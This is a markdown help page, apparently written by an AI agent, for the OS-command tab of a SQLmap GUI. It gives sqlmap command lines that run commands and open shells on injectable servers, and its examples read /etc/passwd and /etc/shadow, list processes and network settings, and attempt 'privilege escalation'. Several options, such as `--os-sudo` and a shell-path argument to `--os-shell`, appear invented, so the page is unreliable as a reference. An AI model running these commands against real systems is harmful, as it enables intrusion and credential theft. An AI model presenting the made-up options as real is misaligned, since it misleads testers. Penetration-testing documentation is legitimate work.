# OS Access Tab - Operating System Command Execution

The OS Access tab controls how SQLmap executes operating system commands on the target database server, providing shell-like access and system administration capabilities.

## 📋 Overview

The OS Access tab contains three main sections:
1. **Command Execution** - Run OS commands on the server
2. **Shell Access** - Interactive shell and command chaining
3. **Privilege Escalation** - System privilege management

## 💻 Command Execution Options

### Execute an Operating System Command
**Parameter:** `--os-cmd=COMMAND`
**Description:** Execute a single OS command on the target server
**Examples:**
```
--os-cmd="whoami"
--os-cmd="id"
--os-cmd="uname -a"
--os-cmd="net user"
--os-cmd="ps aux"
```
**Use Cases:**
- System information gathering
- User privilege checking
- Process enumeration
- Network configuration

### Execute Multiple Commands
**Parameter:** `--os-cmd="COMMAND1 && COMMAND2"`
**Description:** Execute multiple commands using shell operators
**Examples:**
```
--os-cmd="whoami && id && uname -a"
--os-cmd="cat /etc/passwd | grep root"
--os-cmd="netstat -tlnp | grep LISTEN"
--os-cmd="find /var/www -name *.php"
```
**Use Cases:**
- Command chaining
- Output processing
- Complex system queries
- Automated reconnaissance

## 🐚 Interactive Shell Options

### Get an Interactive Shell
**Parameter:** `--os-shell`
**Description:** Spawn an interactive shell on the target server
**Behavior:** Provides persistent shell access
**Use Cases:**
- Interactive system administration
- File system navigation
- Real-time command execution
- Extended reconnaissance

### Shell to Use
**Parameter:** `--os-shell=/bin/bash`
**Description:** Specify shell interpreter to use
**Examples:**
```
/bin/bash (Linux default)
/bin/sh (POSIX shell)
/bin/zsh (Z shell)
cmd.exe (Windows Command Prompt)
powershell.exe (Windows PowerShell)
```
**Use Cases:**
- Shell preference
- Compatibility requirements
- Feature availability
- Scripting capabilities

## 🔧 Advanced OS Access Options

### Execute a SQL Statement
**Parameter:** `--sql-query=QUERY`
**Description:** Execute raw SQL queries
**Examples:**
```
--sql-query="SELECT * FROM users"
--sql-query="SELECT @@version"
--sql-query="SELECT user()"
--sql-query="SHOW TABLES"
```
**Use Cases:**
- Direct database queries
- Custom data extraction
- System information gathering
- Database administration

### Execute a SQL Statement from File
**Parameter:** `--sql-file=FILE`
**Description:** Execute SQL statements from a file
**Examples:**
```
--sql-file=./queries.sql
--sql-file=/path/to/admin_queries.sql
--sql-file=C:\queries\extract_data.sql
```
**Use Cases:**
- Batch SQL execution
- Complex query sets
- Automated data extraction
- Database maintenance

### Execute Operating System Command with Privileges
**Parameter:** `--os-sudo`
**Description:** Execute commands with elevated privileges
**Behavior:** Attempts to use sudo or similar privilege escalation
**Examples:**
```
--os-sudo --os-cmd="whoami"
--os-sudo --os-cmd="cat /etc/shadow"
--os-sudo --os-shell
```
**Use Cases:**
- Administrative tasks
- Restricted file access
- System configuration changes
- Security bypass

## 📊 System Information Gathering

### System Information Commands
**Parameter:** `--os-cmd="SYSTEM_INFO_COMMAND"`
**Description:** Gather comprehensive system information
**Common Commands:**
```bash
# Linux/Unix
uname -a                    # System information
id                         # Current user identity
whoami                     # Current username
cat /etc/passwd            # User accounts
cat /etc/shadow            # Password hashes
ps aux                     # Running processes
netstat -tlnp              # Network connections
df -h                      # Disk usage
free -h                    # Memory usage
lsb_release -a             # Distribution info
```

```cmd
# Windows
whoami                     # Current user
whoami /priv               # User privileges
net user                   # User accounts
net localgroup administrators  # Admin group
tasklist                   # Running processes
netstat -ano               # Network connections
systeminfo                 # System information
wmic os get caption        # OS version
```

### Network Reconnaissance
**Parameter:** `--os-cmd="NETWORK_COMMAND"`
**Description:** Gather network information and configuration
**Examples:**
```bash
# Linux
ifconfig                   # Network interfaces
route -n                   # Routing table
arp -a                     # ARP table
iptables -L                # Firewall rules
cat /etc/hosts             # Hosts file
cat /etc/resolv.conf       # DNS configuration
```

```cmd
# Windows
ipconfig /all              # Network configuration
route print                # Routing table
arp -a                     # ARP table
netsh firewall show config # Firewall rules
type C:\Windows\System32\drivers\etc\hosts
```

## 📝 Usage Examples

### Basic System Information
```
OS Command: whoami
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --os-cmd="whoami"
```

### Interactive Shell Access
```
Interactive Shell: ✓ Enabled
Shell: /bin/bash
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/admin.php?id=1" --os-shell
```

### Privilege Escalation
```
OS Command: cat /etc/shadow
Sudo: ✓ Enabled
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/root.php?id=1" --os-sudo --os-cmd="cat /etc/shadow"
```

### Comprehensive System Reconnaissance
```
OS Command: uname -a && id && whoami && cat /etc/passwd | head -10
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/recon.php?id=1" --os-cmd="uname -a && id && whoami && cat /etc/passwd | head -10"
```

### Windows System Information
```
OS Command: whoami && whoami /priv && systeminfo
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/win.php?id=1" --os-cmd="whoami && whoami /priv && systeminfo"
```

### Network Analysis
```
OS Command: netstat -tlnp && iptables -L && cat /etc/hosts
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/net.php?id=1" --os-cmd="netstat -tlnp && iptables -L && cat /etc/hosts"
```

### File System Exploration
```
OS Command: find /var/www -name "*.php" -type f | head -20
```
**Generated Command:**
```bash
sqlmap -u "http://example.com/files.php?id=1" --os-cmd="find /var/www -name \"*.php\" -type f | head -20"
```

## ⚠️ Important Considerations

### Command Execution Context
- **Database user permissions**: Commands run with database user privileges
- **Web server user**: Often limited permissions (www-data, apache, nobody)
- **Privilege escalation**: May need additional techniques for root/admin access
- **Command availability**: Not all commands may be available in PATH

### Shell Compatibility
- **Unix/Linux**: bash, sh, zsh typically available
- **Windows**: cmd.exe, PowerShell may be available
- **PATH environment**: Commands must be in executable PATH
- **Shell features**: Some shells have different syntax and features

### Security and Detection
- **Audit logging**: Commands may be logged by the system
- **Intrusion detection**: Unusual commands may trigger alerts
- **Anti-malware**: Security software may block certain commands
- **Command history**: Commands may remain in shell history

### Performance and Stability
- **Command execution time**: Some commands may take time to complete
- **Output size**: Large command outputs can cause issues
- **System impact**: Resource-intensive commands may affect server performance
- **Timeout handling**: Long-running commands may timeout

## 🔧 Troubleshooting

### Command Not Found Errors
**Problem:** Commands failing with "command not found"
**Solutions:**
1. Use full paths: `/bin/ls` instead of `ls`
2. Check PATH: `echo $PATH`
3. Verify command availability
4. Use alternative commands

### Permission Denied
**Problem:** Commands failing due to insufficient permissions
**Solutions:**
1. Check current user: `id` or `whoami`
2. Try privilege escalation: `--os-sudo`
3. Use commands that don't require special permissions
4. Check file permissions for target files

### Interactive Shell Not Working
**Problem:** Interactive shell failing to start
**Solutions:**
1. Try different shell: `--os-shell=/bin/sh`
2. Check shell availability
3. Verify network connectivity
4. Use single commands instead

### Command Output Issues
**Problem:** Command output not displaying correctly
**Solutions:**
1. Check for output encoding issues
2. Use output redirection: `command > /tmp/output`
3. Limit output size: `command | head -20`
4. Verify command syntax

### Timeout Errors
**Problem:** Commands timing out before completion
**Solutions:**
1. Use shorter commands
2. Run commands in background if possible
3. Increase timeout values
4. Break complex commands into smaller parts

### Windows-Specific Issues
**Problem:** Windows commands not working as expected
**Solutions:**
1. Use Windows-specific syntax
2. Check PowerShell availability
3. Use full paths for Windows commands
4. Verify command prompt features

## 📚 Related Tabs

- **[File System Tab](file_system_tab.md)**: File system access and manipulation
- **[UDF Tab](udf_tab.md)**: User-defined function creation
- **[Windows Registry Tab](windows_registry_tab.md)**: Windows registry access
- **[General Tab](general_tab.md)**: Output and logging options</content>
<parameter name="filePath">/home/devil/Desktop/SQLmap-GUI-Advanced-SQL-Injection-Testing-Interface/docs/tabs/os_access.md
